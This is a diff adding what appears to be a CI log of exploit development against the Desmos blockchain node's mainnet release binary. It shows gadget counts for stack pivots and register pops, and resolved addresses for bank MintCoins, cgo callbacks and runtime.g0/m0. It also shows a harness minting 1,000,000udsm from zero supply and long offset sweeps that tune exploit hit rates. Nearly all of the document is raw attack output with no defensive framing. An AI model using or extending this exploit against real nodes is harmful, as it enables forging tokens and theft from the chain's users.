@@ -1,0 +1,1000 @@
+
+=== Phase 0: toolchains ===
+installing go1.21.13 ...
+go version go1.21.13 linux/amd64
+installing go1.23.5 ...
+go version go1.23.5 linux/amd64
+installing go1.25.0 ...
+go version go1.25.0 linux/amd64
+installing go1.20.14 ...
+go version go1.20.14 linux/amd64
+go version go1.21.13 linux/amd64
+go version go1.23.5 linux/amd64
+go version go1.25.0 linux/amd64
+go version go1.20.14 linux/amd64
+
+=== Phase 1: Desmos mainnet release binary (v7.1.1) ===
+f57565787bdf427af130ce72854dd9d8ede6601f4231b3c67e0d62c1ca866e2d  /tmp/desmos-ci/desmos-v7.1.1
+/tmp/desmos-ci/desmos-v7.1.1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=xvGHe0V4SKShOvnsNEeZ/YyrGTeDxBuMmkPWGbuOI/_LdKKHc8qUpkAoWI225m/sN964NCAbvRwVz_DGrN5, stripped
+  Type:                              EXEC (Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Entry point address:               0x44f8b9
+/tmp/desmos-ci/desmos-v7.1.1: go1.20.14
+	dep	github.com/CosmWasm/wasmd	v0.45.0	h1:9zBqrturKJwC2kVsfHvbrA++EN0PS7UTXCffCGbg6JI=
+	dep	github.com/CosmWasm/wasmvm	v1.5.3	h1:wcmkey/WkTGwCTHGBD+fRS3cbhhipR9q34kbCZUQSsc=
+	dep	github.com/cometbft/cometbft	v0.37.4	h1:xyvvEqlyfK8MgNIIKVJaMsuIp03wxOcFmVkT26+Ikpg=
+	dep	github.com/cometbft/cometbft-db	v0.11.0	h1:M3Lscmpogx5NTbb1EGyGDaFRdsoLWrUWimFEyf7jej8=
+	dep	github.com/cosmos/cosmos-sdk	v0.47.10
+	=>	github.com/desmos-labs/cosmos-sdk	v0.47.10-desmos	h1:cpNGyZum0b1TgMwrTT2GCWp4Yc2Gv0Z+0a2jJGI0y+Q=
+	dep	github.com/cosmos/ibc-go/v7	v7.4.0	h1:8FqYMptvksgMvlbN4UW9jFxTXzsPyfAzEZurujXac8M=
+     15 wasmer-compiler-singlepass-4.2.2
+      9 wasmer-4.2.2
+      7 corosensei-0.1.3
+
+=== Phase 2: pclntab symbols + objdump (Desmos) ===
+functions: 94217
+objdump lines: 12730647
+{"pivot_add_poprbp": 0, "pivot_add_ret": 169137, "pop_rax": 137, "guard_movups": 24, "guard_movq0": 46, "xor_xmm": 9388, "ud2": 31822, "jmp_ind": 13298, "call_ind": 128326}
+## Go re-entry / cgo
+405260	runtime.cgocallbackg
+405400	runtime.cgocallbackg1
+405780	runtime.cgocallbackg1.func3
+4057e0	runtime.cgocallbackg1.func2
+43f680	runtime.mstart0
+43f720	runtime.mstart1
+43f820	runtime.mstartm0
+440280	runtime.needm
+469c60	runtime.cgocallbackg1.func1
+46f2e0	runtime.rt0_go
+46f480	runtime.mstart
+4713a0	runtime.asmcgocall
+471460	runtime.cgocallback
+473ea0	runtime.cgocallbackg
+474160	runtime.mstart0
+474380	runtime.asmcgocall
+e12840	crosscall2
+## wasmvm callbacks
+17ec400	github.com/CosmWasm/wasmvm/internal/api.cGet
+17ec6a0	github.com/CosmWasm/wasmvm/internal/api.cGet.func1
+17ec700	github.com/CosmWasm/wasmvm/internal/api.cSet
+17ec9c0	github.com/CosmWasm/wasmvm/internal/api.cSet.func1
+17eca20	github.com/CosmWasm/wasmvm/internal/api.cDelete
+17ecc40	github.com/CosmWasm/wasmvm/internal/api.cDelete.func1
+17edfa0	github.com/CosmWasm/wasmvm/internal/api.cQueryExternal
+17ee2c0	github.com/CosmWasm/wasmvm/internal/api.cQueryExternal.func1
+## bank / mint targets
+1a85100	github.com/cosmos/cosmos-sdk/x/bank/keeper.BaseKeeper.SendCoinsFromModuleToAccount
+1a854c0	github.com/cosmos/cosmos-sdk/x/bank/keeper.BaseKeeper.SendCoinsFromModuleToModule
+1a86160	github.com/cosmos/cosmos-sdk/x/bank/keeper.BaseKeeper.MintCoins
+1a8bb60	github.com/cosmos/cosmos-sdk/x/bank/keeper.BaseSendKeeper.addCoins
+1a8c720	github.com/cosmos/cosmos-sdk/x/bank/keeper.BaseSendKeeper.setBalance
+## sdk.Context methods
+dbd880	github.com/cosmos/cosmos-sdk/types.Context.Value
+dbd960	github.com/cosmos/cosmos-sdk/types.Context.KVStore
+dbdd20	github.com/cosmos/cosmos-sdk/types.Context.CacheContext
+dbe040	github.com/cosmos/cosmos-sdk/types.Context.CacheContext.func1
+
+=== Phase 2b: runtime.g0 / m0 candidate derivation (stripped binary) ===
+## ELF entry = 0x44f8b9 ; pclntab runtime.rt0_go = 46f2e0
+
+/tmp/desmos-ci/desmos-v7.1.1:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+000000000044f8b9 <.text+0x4e899>:
+  44f8b9:	48 31 ed             	xor    %rbp,%rbp
+  44f8bc:	48 89 e7             	mov    %rsp,%rdi
+  44f8bf:	48 8d 35 3a 07 bb ff 	lea    -0x44f8c6(%rip),%rsi        # 0x0
+  44f8c6:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
+  44f8ca:	e8 00 00 00 00       	call   0x44f8cf
+  44f8cf:	8b 37                	mov    (%rdi),%esi
+  44f8d1:	48 8d 57 08          	lea    0x8(%rdi),%rdx
+  44f8d5:	49 c7 c0 1c 66 0b 03 	mov    $0x30b661c,%r8
+  44f8dc:	45 31 c9             	xor    %r9d,%r9d
+  44f8df:	48 c7 c1 00 10 40 00 	mov    $0x401000,%rcx
+  44f8e6:	48 c7 c7 a0 dc 4b 00 	mov    $0x4bdca0,%rdi
+  44f8ed:	e9 db ff c4 02       	jmp    0x309f8cd
+  44f8f2:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
+  44f8f9:	00 00 00 
+  44f8fc:	0f 1f 40 00          	nopl   0x0(%rax)
+  44f900:	b8 e0 fc ca 05       	mov    $0x5cafce0,%eax
+  44f905:	48 3d e0 fc ca 05    	cmp    $0x5cafce0,%rax
+  44f90b:	74 13                	je     0x44f920
+  44f90d:	b8 00 00 00 00       	mov    $0x0,%eax
+  44f912:	48 85 c0             	test   %rax,%rax
+  44f915:	74 09                	je     0x44f920
+  44f917:	bf                   	.byte 0xbf
+  44f918:	e0                   	.byte 0xe0
+rt0_go (from entry-stub %rdi) = 0x4bdca0
+## rt0 region @0x4bdca0 (g0/m0 candidates: lea/mov referencing .data/.bss)
+42:  4bdcd8:	48 8d 3d 01 0b 95 05 	lea    0x5950b01(%rip),%rdi        # 0x5e0e7e0
+59:  4bdd1a:	c6 05 4f 64 98 05 01 	movb   $0x1,0x598644f(%rip)        # 0x5e44170
+62:  4bdd28:	89 05 2a 66 98 05    	mov    %eax,0x598662a(%rip)        # 0x5e44358
+63:  4bdd2e:	48 8b 05 f3 52 7b 05 	mov    0x57b52f3(%rip),%rax        # 0x5c73028
+66:  4bdd3a:	48 8d 35 1f f4 ff ff 	lea    -0xbe1(%rip),%rsi        # 0x4bd160
+70:  4bdd51:	48 8d 0d 88 0a 95 05 	lea    0x5950a88(%rip),%rcx        # 0x5e0e7e0
+76:  4bdd6b:	48 8d 3d b6 1a 95 05 	lea    0x5951ab6(%rip),%rdi        # 0x5e0f828
+80:  4bdd84:	48 8b 05 9d 1a 95 05 	mov    0x5951a9d(%rip),%rax        # 0x5e0f828
+84:  4bdd98:	48 8d 0d 41 0a 95 05 	lea    0x5950a41(%rip),%rcx        # 0x5e0e7e0
+87:  4bdda8:	48 8d 05 f1 19 95 05 	lea    0x59519f1(%rip),%rax        # 0x5e0f7a0
+99:  4bdddc:	48 8d 05 bd 5f d9 03 	lea    0x3d95fbd(%rip),%rax        # 0x4253da0
+108:  4bddfd:	48 8d 05 7c 9c dd 03 	lea    0x3dd9c7c(%rip),%rax        # 0x4297a80
+118:  4bde2a:	48 8d 05 ef 24 00 00 	lea    0x24ef(%rip),%rax        # 0x4c0320
+322:  4bdf9b:	48 8d 05 de 4c 00 00 	lea    0x4cde(%rip),%rax        # 0x4c2c80
+530:  4be20a:	48 8d 05 ef 01 00 00 	lea    0x1ef(%rip),%rax        # 0x4be400
+534:  4be219:	48 8d 05 80 02 00 00 	lea    0x280(%rip),%rax        # 0x4be4a0
+538:  4be228:	48 8d 05 11 03 00 00 	lea    0x311(%rip),%rax        # 0x4be540
+542:  4be23a:	48 8d 05 9f 03 00 00 	lea    0x39f(%rip),%rax        # 0x4be5e0
+546:  4be24c:	48 8d 05 6d 04 00 00 	lea    0x46d(%rip),%rax        # 0x4be6c0
+550:  4be25e:	48 8d 05 3b 05 00 00 	lea    0x53b(%rip),%rax        # 0x4be7a0
+554:  4be270:	48 8d 05 09 06 00 00 	lea    0x609(%rip),%rax        # 0x4be880
+558:  4be282:	48 8d 05 d7 06 00 00 	lea    0x6d7(%rip),%rax        # 0x4be960
+562:  4be294:	48 8d 05 a5 07 00 00 	lea    0x7a5(%rip),%rax        # 0x4bea40
+
+=== Phase 4: Desmos-matched harness (go1.21.13 + sdk0.47.10 + wasmvm1.5.3) ===
+harness-desmos-sdk: BUILD OK
+harness-desmos-sdk-g120: BUILD OK
+/tmp/desmos-ci/harness-desmos-sdk: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=58e143d7aeb09fb89bea24a19ff355a02255ef8a, for GNU/Linux 3.2.0, with debug_info, not stripped
+  Type:                              EXEC (Executable file)
+  Entry point address:               0x4025c0
+3a2c54c7c945a8e5fca8b983fd3834a667894205ea36b3fedfe28cba288b944c  /tmp/desmos-ci/harness-desmos-sdk
+M4BANK call=1 err=<nil> supply_before=0udsm supply_after=1000000udsm module_balance=1000000udsm
+
+=== Phase 4b: isolation variants (Go x wasmvm, minimal harness) ===
+h_g121_w153 OK
+h_g121_w155 OK
+h_g123_w153 OK
+h_g123_w155 OK
+h_g120_w153 FAILED
+go: go.mod file indicates go 1.21, but maximum version supported by tidy is 1.20
+
+=== Phase 5: native-chain derivation + PoC-params rate (SDK match + variants) ===
+---- harness-desmos (/tmp/desmos-ci/harness-desmos-sdk) ----
+{"pivot_add_poprbp": 56018, "pivot_add_ret": 12, "pop_rax": 1, "guard_movups": 4, "guard_movq0": 3, "xor_xmm": 2834, "ud2": 6, "jmp_ind": 307, "call_ind": 10383}
+mint=ecc320 cgocb=4703c0 g0=1be2bc0 pivot=ed39c0 poprax=ed39d0 guard=ed39e0 ud2=ed39f0
+  ecc320 t main.mintBridge
+  4703c0 t runtime.cgocallback.abi0
+  409fe0 t runtime.cgocallbackg
+  472d00 t runtime.cgocallbackg.abi0
+  40a1a0 t runtime.cgocallbackg1
+  469420 t runtime.cgocallbackg1.func1
+  40a580 t runtime.cgocallbackg1.func2
+  40a520 t runtime.cgocallbackg1.func3
+ 1be2bc0 d runtime.g0
+ 1be31e0 d runtime.m0
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/4 exits=[2, 0, 139, 2] rips=['0x750ce2131bdb']
+[recal] best = null
+---- harness-desmos-g120 (/tmp/desmos-ci/harness-desmos-sdk-g120) ----
+{"pivot_add_poprbp": 1, "pivot_add_ret": 58386, "pop_rax": 1, "guard_movups": 5, "guard_movq0": 3, "xor_xmm": 2805, "ud2": 5, "jmp_ind": 289, "call_ind": 10437}
+mint=f6a2c0 cgocb=470c60 g0=1c78700 pivot=f71a10 poprax=f71a20 guard=f71a30 ud2=f71a40
+  f6a2c0 t main.mintBridge
+  470c60 t runtime.cgocallback.abi0
+  4088a0 t runtime.cgocallbackg
+  473660 t runtime.cgocallbackg.abi0
+  408a40 t runtime.cgocallbackg1
+  469960 t runtime.cgocallbackg1.func1
+  408e20 t runtime.cgocallbackg1.func2
+  408dc0 t runtime.cgocallbackg1.func3
+ 1c78700 d runtime.g0
+ 1c78ce0 d runtime.m0
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0} -> hits=1/4 exits=[139, 139, 139, 1] rips=['0x7bf0fa533bdb', '0x76b6f9c28bdb', '0x74018b333bdb']
+[recal] best = {"shape": {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0}, "hits": 1, "attempts": 4, "exits": [139, 139, 139, 1], "rips": ["0x7bf0fa533bdb", "0x76b6f9c28bdb", "0x74018b333bdb"]}
+---- h_g121_w153 (/tmp/desmos-ci/h_g121_w153) ----
+{"pivot_add_poprbp": 5491, "pivot_add_ret": 12, "pop_rax": 1, "guard_movups": 1, "guard_movq0": 0, "xor_xmm": 817, "ud2": 6, "jmp_ind": 146, "call_ind": 950}
+mint=5690e0 cgocb=4682c0 g0=73ffa0 pivot=56ffc0 poprax=56ffd0 guard=56ffe0 ud2=56fff0
+  5690e0 t main.mintBridge
+  4682c0 t runtime.cgocallback.abi0
+  406780 t runtime.cgocallbackg
+  46a9c0 t runtime.cgocallbackg.abi0
+  406940 t runtime.cgocallbackg1
+  4627c0 t runtime.cgocallbackg1.func1
+  406d20 t runtime.cgocallbackg1.func2
+  406cc0 t runtime.cgocallbackg1.func3
+  73ffa0 d runtime.g0
+  740380 d runtime.m0
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/4 exits=[2, 139, 2, 2] rips=['0x7e5ba4f52bdb']
+[recal] best = null
+---- h_g121_w155 (/tmp/desmos-ci/h_g121_w155) ----
+{"pivot_add_poprbp": 5491, "pivot_add_ret": 12, "pop_rax": 1, "guard_movups": 1, "guard_movq0": 0, "xor_xmm": 817, "ud2": 6, "jmp_ind": 146, "call_ind": 950}
+mint=5690e0 cgocb=4682c0 g0=73ffa0 pivot=56ffc0 poprax=56ffd0 guard=56ffe0 ud2=56fff0
+  5690e0 t main.mintBridge
+  4682c0 t runtime.cgocallback.abi0
+  406780 t runtime.cgocallbackg
+  46a9c0 t runtime.cgocallbackg.abi0
+  406940 t runtime.cgocallbackg1
+  4627c0 t runtime.cgocallbackg1.func1
+  406d20 t runtime.cgocallbackg1.func2
+  406cc0 t runtime.cgocallbackg1.func3
+  73ffa0 d runtime.g0
+  740380 d runtime.m0
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/4 exits=[2, 2, 2, 2] rips=[]
+[recal] best = null
+---- h_g123_w153 (/tmp/desmos-ci/h_g123_w153) ----
+{"pivot_add_poprbp": 5855, "pivot_add_ret": 12, "pop_rax": 1, "guard_movups": 1, "guard_movq0": 0, "xor_xmm": 927, "ud2": 7, "jmp_ind": 150, "call_ind": 1029}
+mint=58e4a0 cgocb=4743a0 g0=790ec0 pivot=595280 poprax=595290 guard=5952a0 ud2=5952b0
+  58e4a0 t main.mintBridge
+  4743a0 t runtime.cgocallback.abi0
+  406f20 t runtime.cgocallbackg
+  476a60 t runtime.cgocallbackg.abi0
+  407140 t runtime.cgocallbackg1
+  4074c0 t runtime.cgocallbackg1.deferwrap1
+  407460 t runtime.cgocallbackg1.deferwrap2
+  466fa0 t runtime.cgocallbackg1.func1
+  790ec0 d runtime.g0
+  791b40 d runtime.m0
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0} -> hits=3/4 exits=[1, 1, 139, 1] rips=['0x75577b755bdb']
+[recal] best = {"shape": {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0}, "hits": 3, "attempts": 4, "exits": [1, 1, 139, 1], "rips": ["0x75577b755bdb"]}
+---- h_g123_w155 (/tmp/desmos-ci/h_g123_w155) ----
+{"pivot_add_poprbp": 5855, "pivot_add_ret": 12, "pop_rax": 1, "guard_movups": 1, "guard_movq0": 0, "xor_xmm": 927, "ud2": 7, "jmp_ind": 150, "call_ind": 1029}
+mint=58e4a0 cgocb=4743a0 g0=790ec0 pivot=595280 poprax=595290 guard=5952a0 ud2=5952b0
+  58e4a0 t main.mintBridge
+  4743a0 t runtime.cgocallback.abi0
+  406f20 t runtime.cgocallbackg
+  476a60 t runtime.cgocallbackg.abi0
+  407140 t runtime.cgocallbackg1
+  4074c0 t runtime.cgocallbackg1.deferwrap1
+  407460 t runtime.cgocallbackg1.deferwrap2
+  466fa0 t runtime.cgocallbackg1.func1
+  790ec0 d runtime.g0
+  791b40 d runtime.m0
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0} -> hits=2/4 exits=[139, 1, 1, 139] rips=['0x7e7a4322abdb', '0x7eda8c68abdb']
+[recal] best = {"shape": {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0}, "hits": 2, "attempts": 4, "exits": [139, 1, 1, 139], "rips": ["0x7e7a4322abdb", "0x7eda8c68abdb"]}
+[h_g120_w153] not built
+
+=== Phase 6: diagnostics + call-phase/dummy sweep on the Desmos match ===
+{"pivot_add_poprbp": 56018, "pivot_add_ret": 12, "pop_rax": 1, "guard_movups": 4, "guard_movq0": 3, "xor_xmm": 2834, "ud2": 6, "jmp_ind": 307, "call_ind": 10383}
+mint=ecc320 cgocb=4703c0 g0=1be2bc0 pivot=ed39c0 poprax=ed39d0 guard=ed39e0 ud2=ed39f0
+  ecc320 t main.mintBridge
+  4703c0 t runtime.cgocallback.abi0
+  409fe0 t runtime.cgocallbackg
+  472d00 t runtime.cgocallbackg.abi0
+  40a1a0 t runtime.cgocallbackg1
+  469420 t runtime.cgocallbackg1.func1
+  40a580 t runtime.cgocallbackg1.func2
+  40a520 t runtime.cgocallbackg1.func3
+ 1be2bc0 d runtime.g0
+ 1be31e0 d runtime.m0
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 0, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 4, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 8, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 12, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 16, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 20, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 24, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 28, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 32, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 36, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 40, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 44, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 48, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 52, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 56, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 60, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 64, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 68, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 72, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 76, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 80, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 84, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 88, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 92, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 96, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 100, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 104, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 108, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 112, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 116, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 120, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 124, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 128, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 132, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 136, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 140, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 144, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 148, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 152, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 156, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 160, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 164, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 168, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 172, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 176, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 180, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 184, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 188, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 192, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 196, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 200, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 204, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 208, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 212, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 216, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 220, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 224, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 228, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 232, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x76ac19f30bdb', '0x718888d36bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 236, "dummy": 0} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 240, "dummy": 0} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 244, "dummy": 0} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 248, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x73847d9ca0e7', '0x71def7a2cbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 252, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7d88e29670e7', '0x712b2b63dbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 256, "dummy": 0} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 260, "dummy": 0} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 264, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7f097da470e7', '0x736a8a135bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 268, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x743c8406e0e7', '0x7aca0e62ebdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 272, "dummy": 0} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 276, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x756c051f40e7', '0x71940a84a0e7']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 280, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 284, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7b239c138bdb', '0x7297f8136bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 288, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 292, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 296, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 300, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x7f881b84abdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 304, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 308, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 312, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 316, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x79122ff39bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 320, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 324, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x745bde339bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 328, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x7ab649d38bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 332, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 336, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 340, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x7a91280ffbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 344, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
